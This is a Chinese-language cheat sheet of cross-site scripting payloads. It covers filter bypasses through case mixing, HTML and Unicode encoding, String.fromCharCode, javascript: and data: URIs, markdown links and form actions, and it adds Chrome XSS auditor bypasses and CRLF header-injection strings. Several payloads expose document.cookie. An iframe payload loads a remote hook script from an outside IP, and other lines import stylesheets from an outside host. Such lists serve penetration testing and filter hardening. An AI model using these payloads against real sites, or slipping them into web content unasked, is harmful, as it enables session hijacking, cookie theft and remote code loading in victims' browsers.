Payload
================================

弹框
---------------------------------------------------
+ ``alert('我是个弹窗');``
    在浏览器中弹出警告框，提示用户一些信息。
+ ``confirm('我是个确认弹窗?');``
    在浏览器中弹出确认框，让用户进行确认或取消操作。
+ ``prompt('我是个输入框';``
    在浏览器中弹出输入框，让用户输入一些信息。



常用的XSS绕过payload
---------------------------------------------------
+ ``<img src="x" onerror=alert(1)>``
+ ``onpointerrawupdate=(prompt)(123)%3E``
    //这个事件只针对谷歌
+ ``<img src=1 onmouseover=alert('xss')>``
+ ``<a href="javascript:alert(1)">baidu</a>``
+ ``<a href="javascript:aaa" onmouseover="alert(/xss/)">aa</a>``
+ ``<script>alert('xss')</script>``
+ ``<script>prompt('xss')</script>``
+ ``<input value="" onclick=alert('xss') type="text">``
+ ``<input name="name" value="" onmouseover=prompt('xss') bad="">``
+ ``<iframe src="javascript:alert('xss')"><iframe>``
+ ``<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">``
+ ``<iframe src="aaa" onmouseover=alert('xss') /><iframe>``
+ ``<iframe src="javascript:prompt(`xss`)"></iframe>``
+ ``<svg onload=alert(1)>``
+ ``<input name="name" value="" onmouseover=prompt('xss') bad="">``
+ ``<input type=“hidden” accesskey=“X” onclick="alert(1)"">``
+ ``eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41))``
    适用于绕过黑名单 alert 在跨站中，String.fromCharCode 主要是使到
    一些已经被列入黑名单的关键字或语句安全通过检测，把关键字或语句转换成为 ASCII 码，
    然后再用 String.fromCharCode 还原，因为大多数的过滤系统都不会把 String.fromCharCode
    加以过滤，例如关键字 alert 被过滤掉，那就可以这么利用 alert(document.cookie)
+ ``<img src="1" onerror=alert(1)>``
+ ``<img src="1" onerror=alert(1)>（实体化()``
+ ``<img src=1 onerror=alert()>``
+ ``<script>\u0061\u006c\u0065\u0072\u0074(1)</script>``
+ ``<img src="1" onerror=location="javascript:alert(1)">``
+ ``<img src="1" onerror=location="javascript:alert%281%29">``


大小写绕过
---------------------------------------------------

- ``<script>alert(1)</script>``
- ``<sCrIpT>alert(1)</sCrIpT>``
- ``<ScRiPt>alert(1)</ScRiPt>``
- ``<sCrIpT>alert(1)</ScRiPt>``
- ``<ScRiPt>alert(1)</sCrIpT>``
- ``<img src=1 onerror=alert(1)>``
- ``<iMg src=1 oNeRrOr=alert(1)>``
- ``<ImG src=1 OnErRoR=alert(1)>``
- ``<img src=1 onerror="alert(&quot;M&quot;)">``
- ``<marquee onscroll=alert(1)>``
- ``<mArQuEe OnScRoLl=alert(1)>``
- ``<MaRqUeE oNsCrOlL=alert(1)>``

常见on事件
---------------------------------------------------
+ onload: 当页面或图片加载完成时触发。
+ onunload: 当页面或图片被卸载或关闭时触发。
+ onsubmit: 当表单被提交时触发。
+ onreset: 当表单被重置时触发。
+ onclick: 当鼠标单击元素时触发。
+ ondblclick: 当鼠标双击元素时触发。
+ onmousedown: 当鼠标按下时触发。
+ onmouseup: 当鼠标抬起时触发。
+ onmouseover: 当鼠标移动到元素上时触发。
+ onmouseout: 当鼠标移出元素时触发。
+ onmousemove: 当鼠标移动时触发。
+ onkeydown: 当键盘按下时触发。
+ onkeyup: 当键盘抬起时触发。
+ onkeypress: 当键盘按键被按下并放开时触发。
+ onfocus: 当元素获得焦点时触发。
+ onblur: 当元素失去焦点时触发。
+ onchange: 当元素的值发生改变时触发。
+ onresize: 当窗口或元素大小改变时触发。
+ onscroll: 当元素滚动时触发。
+ onafterprint: 当页面打印完成后触发
+ onbeforeprint: 当页面开始打印时触发
+ onbeforeunload: 当用户关闭页面或离开页面时触发
+ onerror: 当页面或资源加载错误时触发
+ onhashchange: 当页面 URL 的哈希部分发生变化时触发，HTML5 中新增的事件
+ onoffline: 当浏览器离线时触发，HTML5 中新增的事件
+ ononline: 当浏览器在线时触发，HTML5 中新增的事件
+ onpagehide: 当用户离开页面时触发
+ onpageshow: 当用户进入页面时触发
+ onpopstate: 当页面的历史记录发生变化时触发，HTML5 中新增的事件
+ onresize: 当窗口或元素大小改变时触发
+ onunload: 当页面或图片被卸载或关闭时触发
+ onabort: 当页面或图片被终止加载时触发
+ onanimationend: 当 CSS 动画结束时触发，HTML5 中新增的事件
+ onanimationiteration: 当 CSS 动画循环播放时触发，HTML5 中新增的事件
+ onanimationstart: 当 CSS 动画开始播放时触发，HTML5 中新增的事件
+ onaudioend: 当音频播放结束时触发
+ onaudioprocess: 当音频处理中发生变化时触发，HTML5 中新增的事件
+ onaudiostart: 当音频开始播放时触发
+ onbeforeinput: 在元素接收到用户输入之前触发，HTML5 中新增的事件
+ onbeforeunload: 当用户关闭页面或离开页面时触发
+ onblur: 当元素失去焦点时触发
+ oncancel: 当用户取消操作时触发，HTML5 中新增的事件
+ oncanplay: 当视频可以开始播放时触发
+ oncanplaythrough: 当视频可以正常播放，而无需停顿和缓冲时触发
+ onclose: 当 WebSocket 连接关闭时触发，HTML5 中新增的事件
+ oncontextmenu: 当用户右键单击元素时触发
+ oncuechange: 当音频或视频文本轨道发生变化时触发
+ ondblclick: 当鼠标双击元素时触发
+ ondrag: 当元素被拖拽时触发
+ ondragend: 当元素拖拽结束时触发
+ ondragexit: 当被拖拽的元素离开目标元素时触发
+ ondragleave: 当被拖拽的元素离开目标元素时触发，HTML5 中新增的事件
+ ondragover: 当被拖拽的元素在目标元素上方移动时触发
+ ondragstart: 当元素开始拖拽时触发
+ ondrop: 当被拖拽的元素被放置在目标元素上时触发
+ ondurationchange: 当视频或音频的时长发生变化时触发
+ onemptied: 当元素的媒体资源为空时触发
+ onended: 当视频或音频播放完成时触发
+ onerror: 当元素加载失败时触发
+ onfocus: 当元素获得焦点时触发
+ oninput: 当元素接收到用户输入时触发，HTML5 中新增的事件
+ oninvalid: 当元素无效时触发，HTML5 中新增的事件
+ onkeydown: 当用户按下键盘上的某个键时触发
+ onkeypress: 当用户按下键盘上的某个键时触发，如果持续按下会多次触发
+ onkeyup: 当用户释放键盘上的某个键时触发
+ onloadeddata: 当媒体数据已加载完成时触发
+ onloadedmetadata: 当媒体的元数据已加载完成时触发
+ onloadstart: 当元素开始加载时触发
+ onmousedown: 当鼠标按下时触发
+ onmouseenter: 当鼠标进入元素时触发，HTML5 中新增的事件
+ onmouseleave: 当鼠标离开元素时触发，HTML5 中新增的事件
+ onmousemove: 当鼠标在元素内移动时触发
+ onmouseout: 当鼠标移出元素时触发
+ onmouseover: 当鼠标移动到元素上方时触发
+ onmouseup: 当鼠标松开时触发
+ onmousewheel: 当鼠标滚轮滚动时触发
+ onpause: 当元素暂停时触发
+ onplay: 当元素开始播放时触发
+ onplaying: 当元素已经开始播放时触发
+ onprogress: 当元素正在下载时触发
+ onratechange: 当媒体播放速率发生变化时触发
+ onreset: 当表单重置时触发
+ onresize: 当窗口或元素大小发生变化时触发
+ onscroll: 当元素滚动时触发
+ onseeking: 当媒体正在定位时触发
+ onselect: 当文本被选中时触发
+ onstalled: 当元素尝试加载媒体资源，但资源不可用时触发
+ onsubmit: 当表单提交时触发
+ onsuspend: 当媒体资源暂停下载时触发
+ ontimeupdate: 当当前播放时间已更改时触发
+ onunload: 当页面卸载时触发
+ onvolumechange: 当音量发生变化时触发
+ onwaiting: 当媒体暂停以缓冲更多数据时触发


特殊的绕过
---------------------------------------------------
+ ``<img src=x on(mouseover)=if(event.target.tagName=='IMG')(prompt)(1)>``
+ 利用 JavaScript 语句块绕过过滤。例如： ``<img src=x onmouseover="{if(1){prompt(1)}}">``
+ 利用 HTML 编码绕过过滤。例如： ``<img src=x onmouseover="&#x69;&#x66;&#x28;&#x31;&#x29;&#x7B;&#x70;&#x72;&#x6F;&#x6D;&#x70;&#x74;&#x28;&#x31;&#x29;&#x7D;">``
+ 利用特殊字符绕过过滤。例如 ``<img src=x onmouseover="ｐｒｏｍｐｔ(1)">``
+ 利用内联事件绑定绕过过滤。例如：
    ::
        <img src=x>
        <script>
        document.querySelector('img').onmouseover = function() { prompt(1) }
        </script>
+ 用 JavaScript 闭包绕过过滤。例如： ``<img src=x onmouseover="(function(){prompt(1)})();">``

伪协议
---------------------------------------------------

- ``<a href=javascript:/0/,alert(%22M%22)>M</a>``
- ``<a href=javascript:/00/,alert(%22M%22)>M</a>``
- ``<a href=javascript:/000/,alert(%22M%22)>M</a>``
- ``<a href=javascript:/M/,alert(%22M%22)>M</a>``


Chrome XSS auditor bypass
---------------------------------------------------

- ``?param=https://&param=@z.exeye.io/import%20rel=import%3E``
- ``<base href=javascript:/M/><a href=,alert(1)>M</a>``
- ``<base href=javascript:/M/><iframe src=,alert(1)></iframe>``

长度限制
---------------------------------------------------

:: 

    <script>s+="l"</script>
    \...
    <script>eval(s)</script>

jquery sourceMappingURL
---------------------------------------------------
    ``</textarea><script>var a=1//@ sourceMappingURL=//xss.site</script>``

图片名
---------------------------------------------------
    ``"><img src=x onerror=alert(document.cookie)>.gif``

过期的payload
---------------------------------------------------
- src=javascript:alert基本不可以用
- css expression特性只在旧版本ie可用

css
---------------------------------------------------

::

    <div style="background-image:url(javascript:alert(/xss/))">
    <STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>


markdown
---------------------------------------------------

::

    [a](javascript:prompt(document.cookie))
    [a](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))
    <&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>  
    ![a'"`onerror=prompt(document.cookie)](x)
    [notmalicious](javascript:window.onerror=alert;throw%20document.cookie)
    [a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)
    ![a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)


iframe
---------------------------------------------------

::

    <iframe onload='
        var sc   = document.createElement("scr" + "ipt");
        sc.type  = "text/javascr" + "ipt";
        sc.src   = "http://1.2.3.4/js/hook.js";
        document.body.appendChild(sc);
        '
    />

- ``<iframe src=javascript:alert(1)></iframe>``
- ``<iframe src="data:text/html,<iframe src=javascript:alert('M')></iframe>"></iframe>``
- ``<iframe src=data:text/html;base64,PGlmcmFtZSBzcmM9amF2YXNjcmlwdDphbGVydCgiTWFubml4Iik+PC9pZnJhbWU+></iframe>``
- ``<iframe srcdoc=<svg/o&#x6E;load&equals;alert&lpar;1)&gt;></iframe>``
- ``<iframe src=https://baidu.com width=1366 height=768></iframe>``
- ``<iframe src=javascript:alert(1) width=1366 height=768></iframe``

form
---------------------------------------------------

- ``<form action=javascript:alert(1)><input type=submit>``
- ``<form><button formaction=javascript:alert(1)>M``
- ``<form><input formaction=javascript:alert(1) type=submit value=M>``
- ``<form><input formaction=javascript:alert(1) type=image value=M>``
- ``<form><input formaction=javascript:alert(1) type=image src=1>``

meta
---------------------------------------------------

``<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">``

CRLF
---------------------------------------------------

- 探测漏洞

	``%0d%0aheader:header``
	``%0aheader:header``
	``%0dheader:header``
	``%23%0dheader:header``
	``%3f%0dheader:header``
	``/%250aheader:header``
	``/%25250aheader:header``
	``/%%0a0aheader:header``
	``/%3f%0dheader:header``
	``/%23%0dheader:header``
	``/%25%30aheader:header``
	``/%25%30%61header:header``
	``/%u000aheader:header``

- 开放重定向

	``/www.google.com/%2f%2e%2e%0d%0aheader:header``

- CRLF-XSS

	``%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2e%2e``

- XSS绕过

	``%2Fxxx:1%2F%0aX-XSS-Protection:0%0aContent-Type:text/html%0aContent-Length:39%0a%0a%3cscript%3ealert(document.cookie)%3c/``

- Location

	``%0d%0aContent-Type:%20text%2fhtml%0d%0aHTTP%2f1.1%20200%20OK%0d%0aContent-Type:%20text%2fhtml%0d%0a%0d%0a%3Cscript%3Ealert('XSS');%3C%2fscript%3E``

参考
---------------------------------
+ ``https://swisskyrepo.github.io/PayloadsAllTheThings/XSS%20Injection/``
